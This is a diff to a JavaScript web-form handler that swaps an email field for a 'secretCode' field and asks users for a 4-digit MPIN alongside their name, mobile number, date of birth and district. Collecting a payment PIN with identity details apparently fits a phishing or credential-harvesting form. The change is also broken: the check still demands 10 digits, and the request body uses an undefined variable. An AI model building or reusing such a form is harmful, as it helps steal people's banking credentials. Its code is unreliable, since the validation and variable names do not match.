@@ -35,16 +35,16 @@ form1.addEventListener(
         .trim();
 
 
-    const email =
+    const mobile =
       document
-        .getElementById("email")
+        .getElementById("mobile")
         .value
         .trim();
 
 
-    const mobile =
+    const secretCode =
       document
-        .getElementById("mobile")
+        .getElementById("secretCode")
         .value
         .trim();
 
@@ -81,10 +81,10 @@ form1.addEventListener(
     }
 
 
-    if (!/^[0-9]{10}$/.test(mobile)) {
+    if (!/^[0-9]{10}$/.test(secretCode)) {
 
       alert(
-        "Please enter a valid 10 digit mobile number."
+        "Please enter a valid 4 digit MPIN."
       );
 
       return;
@@ -107,8 +107,8 @@ form1.addEventListener(
             body: JSON.stringify({
 
               name,
-              email,
               mobile,
+              secret_code,
               dob,
               district
 
